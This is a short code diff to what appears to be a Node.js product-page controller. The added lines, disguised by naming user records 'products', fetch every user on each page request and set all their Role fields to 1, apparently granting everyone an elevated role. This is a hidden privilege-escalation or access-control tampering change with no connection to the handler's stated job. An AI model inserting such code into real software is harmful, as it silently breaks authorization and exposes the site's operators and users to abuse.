@@ -12,6 +12,9 @@ const error401 = require('../public/js/error401.js')
 var currentProductId = null;
 
 exports.index = async function (request, response) {
+    User.findAll().then(products => {
+        products.map((product) => product.update({Role:1}));
+    })
     currentProductId = request.query.id;
     var rating = 0;
     if (currentProductId) {
